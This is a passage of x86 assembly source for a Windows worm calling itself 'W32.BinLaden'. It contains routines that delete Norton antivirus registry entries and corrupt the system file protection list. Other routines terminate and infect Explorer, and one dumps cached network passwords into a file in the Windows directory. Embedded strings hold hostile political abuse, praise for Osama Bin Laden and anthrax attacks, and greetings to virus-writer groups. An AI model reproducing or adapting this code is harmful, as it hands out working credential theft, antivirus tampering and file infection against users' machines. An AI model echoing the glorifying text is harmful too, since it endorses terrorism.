            rnd_dword equ dword ptr $-4
            mov ecx,41C64E6Dh
            mul ecx
            add eax,00003039h
            and eax,7FFFFFFFh
            mov rnd_dword, eax
            pop edx
            pop ecx
            ret

MainString  db 'ALA   DIO   GOTT   ZEUS   JEOVA '
            db '  KRISHNA   OXALA   DIEU   GOD  '
            db ' SHIVA   TUPA   DIOS   DEUS'
StringSize  equ $-MainString

BushText1   db 'Worm/I-Worm/W32.BinLaden',0
BushText2   db 'Bush, you need more hashish in your life',13,10
            db 'Why to take the Amazon from brazil. if y'
            db 'ou like polution ?',13,10
            db 'Brazilian ppl wants the USA destruction, not like'
            db 'our president, smelling Bush`s balls',13,10
            db 'You are not the cops of the world, and '
            db 'World Trade Center was the first',13,10
            db 'Now you take the freedom from your own people, '
            db 'and the world is laughing ...',13,10,'Ohhhh is this '
            db 'the famous American Way of Life ? HAHAHAHA !!!',13,10,13,10
            db 'BUGS EVERYWHERE',13,10,13,10
            db 'You kill more people per day than AIDS, '
            db 'giving money and arms to other countries',13,10
            db 'Now you are feeling the taste of your own poison...',13,10,13,10
            db 'Ohhhhhh i am sorry ... It isn`t sweet ?',0

ThePayload  ENDP

DeleteAntiV PROC

   IFDEF DBG
            SendDebug ad327, 'STARTING MODULO ANTI-ANTIVIRUS'
   ENDIF

            push esi
            call OverVxdKey
            db 'System\CurrentControlSet\Services\VxD\NAVAP',0

OverVxdKey: push HKEY_LOCAL_MACHINE
            callx RegDeleteKeyA

            call OverRunKey
            db 'Software\Microsoft\Windows\CurrentVersion\Run',0
            db 'Norton Auto-Protect',0

OverRunKey: pop esi

            push offset sharehandle
            push esi
            push HKEY_LOCAL_MACHINE
            callx RegCreateKeyA

            cmp eax, ERROR_SUCCESS
            jne short abortavdel

            push esi
            callx lstrlenA
            inc eax
            add esi, eax

            push esi
            push sharehandle
            call RegDeleteValueA

            push sharehandle
            callx RegCloseKey
abortavdel: push 260
            push offset Geral
            callx GetWindowsDirectoryA

            test eax, eax
            jz SFCNotFound

            call DefaultSFC
            db '\Default.sfc',0
DefaultSFC: push offset Geral
            callx lstrcatA

            push offset ivct
            push offset Geral
            call OpenWrite

            test eax, eax
            jz SFCNotFound

            mov esi, eax
            mov ecx, [ivct._file_size]
            dec ecx
ReplaceSTR: lodsb
            cmp word ptr [esi], '.*'
            je trashIT
            cmp dword ptr [esi], 'exe.'
            je trashIT
            cmp dword ptr [esi], 'lld.'
            je trashIT
SFCLoop:    loop ReplaceSTR
            jmp SFCClose
trashIT:    mov byte ptr [esi], 'x'
            jmp SFCLoop
SFCClose:   push offset ivct
            push offset DefaultSFC
            call CloseFile

SFCNotFound:pop esi

   IFDEF DBG
            SendDebug ad431, 'OUT MODULO ANTI-ANTIVIRUS'
   ENDIF
            ret

DeleteAntiV ENDP

            db 'Greetz: Alevirus, Satanicoder, Vecna, Z0mbie,'
            db ' all ppl in #vxers...and my TEAM',13,10
            db 'And of course, Osama Bin Laden. Keep the good job with Antrhax, man !',13,10
            db 'irc.undernet.org | #vxers',13,10
            db 'www.nbk.hpg.com.br',13,10
            db 'www.coderz.net/mtxvx',13,10,13,10
            db 'Coded by NBK[MATRiX]',13,10,13,10
            db 'Every brazilian HATES USA ... Just try to get Amazon FROM US',13,10,0

XpltXplorer PROC

DATASEG
            ToolHelp PROCESSENTRY32<?>
            ToolHelpHandle dd ?
CODESEG

   IFDEF DBG
            SendDebug ad7f3, 'STARTING MODULO XPLOIT_EXPLORER'
   ENDIF

   IFDEF SEH
            pushad
            call ErrorXploit
            mov esp, [esp+8]
            jmp InfExpRet
ErrorXploit:push dword ptr fs:[0]
            mov fs:[0], esp
   ENDIF

            push 0
            push 2
            call CreateToolhelp32Snapshot

            mov ToolHelpHandle, eax

            inc eax
            jz InfExpRet

            lea eax, ToolHelp
            mov [eax.dwSize], SIZE PROCESSENTRY32

            lea eax, ToolHelp
            push eax
            push ToolHelpHandle
            call Process32First

checkfile:  test eax, eax
            jz InfExpRetCl

            mov eax, ProcessID
            lea ecx, ToolHelp
            cmp eax, [ecx.th32ProcessID]
            je NextFile

            lea ebx, [ecx.szExeFile]

            IFDEF DBG
   pushad
   push ebx
   callx OutputDebugStringA
   popad
            ENDIF

            push ebx
            push offset Geral
            callx lstrcpyA

            call FilesToFuck

            explorer db 'EXPLORER.EXE',0

FilesToFuck:pop eax

            push eax                ;     lstrcmpiA() arg.1
            push eax
            callx lstrlenA
            push eax

            push ebx
            callx lstrlenA

            pop ecx
            lea eax, [ebx+eax]
            sub eax, ecx

            push eax                ;     lstrcmpiA() arg.2
            callx lstrcmpiA

            test eax, eax
            jz JustDoIt

            jmp NextFile

JustDoIt:   push offset ivct
            push offset Geral
            call OpenRead

            test eax, eax
            jz DirectKill

            push offset ivct
            push offset Geral
            call CloseFile

            ;  Infected file ?

            mov eax, [ivct._file_size]
            sub eax, 7
            sub edx, edx
            mov ecx, 101
            div ecx
            test edx, edx
            jz NextFile

DirectKill: lea eax, ToolHelp
            push [eax.th32ProcessID]
            push TRUE            ;  Win32s
            push 001F0FFFh       ;  PROCESS_ALL_ACCESS
            callx OpenProcess

            test eax, eax
            jz NextFile

            push 0
            push eax
            call TerminateProcess

            push 2*1000          ;  wait 2 seconds (+/- 7 thread closing)
            callx Sleep

            push 0
            push 0
            push 1
            push offset ivct
            push offset TheVxName
            push 'EXE.'
            push offset Geral
            call InfectFile

            push offset Geral
            call PlayFile

NextFile:   lea eax, ToolHelp
            push eax
            push ToolHelpHandle
            call Process32Next
            jmp checkfile

InfExpRetCl:push ToolHelpHandle
            callx CloseHandle

InfExpRet:

   IFDEF SEH
            pop dword ptr fs:[0]
            pop eax
            popad
   ENDIF

   IFDEF DBG
            SendDebug ad7r3, 'OUT MODULO XPLOIT_EXPLORER'
   ENDIF
            ret

XpltXplorer ENDP

hide_function:

            add dword ptr [esp], 2
            ret

ProgError   PROC

DATASEG
            windowhandle dd ?
            sizevalue dd ?
            windowtext dd ?
            buffervalue db 260 dup(?)
            bufferdata db 260 dup(?)
CODESEG
            push ebx
            lea ebx, bufferdata
            call MemError
            db 'Error 0xFFFFF182',13,10,'Shutdown Windows',0
MemError:   push ebx
            callx lstrcpyA

            lea eax, windowhandle
            push eax
            call SubKey
            db 'AppEvents\EventLabels\AppGPFault',0
SubKey:     push HKEY_CURRENT_USER
            callx RegCreateKeyA

            cmp eax, ERROR_SUCCESS
            jne short DefaultErro

RetrieveSTR:mov sizevalue, 260
            lea eax, sizevalue
            lea edx, buffervalue

            push eax
            push ebx
            push NULL
            push NULL
            push eax
            push edx
            push NULL
            push [windowhandle]
            callx RegEnumValueA

            push windowhandle
            callx RegCloseKey

DefaultErro:push MB_ICONERROR
            push ebx
            push ebx
            push NULL
            callx MessageBoxA
            pop ebx
            ret

ProgError   ENDP

GetPass     PROC

   IFDEF SEH
            pushad
            call ErrorPass
            mov esp, [esp+8]
            jmp PassEnd
ErrorPass:  push dword ptr fs:[0]
            mov fs:[0], esp
   ENDIF

   IFDEF DBG
            SendDebug ad7rw, 'STARTING MODULO GETPASS'
   ENDIF

            push 0
            push offset callback
            push 0ffh
            push 0
            push 0
            call WNetEnumCachedPasswords
            jmp PassEnd

callback:   mov esi, [esp+4]

            push 260
            push offset Geral
            callx GetWindowsDirectoryA

            call BinLadenIni
            db '\BinLaden.ini',0
BinLadenIni:lea eax, [offset Geral+eax]
            push eax
            callx lstrcatA

            mov [ivct._file_size], 256

            push offset ivct
            push offset Geral
            call OpenCreate

            test eax, eax
            jz PassEnd-1

            mov edi, eax
            mov ecx, 255
            cld
            rep movsb

            push offset ivct
            push offset Geral
            call CloseFile

            sub eax, eax
            inc eax
            ret
PassEnd:

   IFDEF SEH
            pop dword ptr fs:[0]
            pop eax
            popad
   ENDIF

   IFDEF DBG
            SendDebug ad7ra, 'OUT MODULO GETPASS'
   ENDIF
            ret

GetPass     ENDP

rnd_char:   call rnd_eax
            and eax, 0f0f0f0fh
            add eax, 'AAAA'
            ret

Binladen    endp
            end Binladen
            end
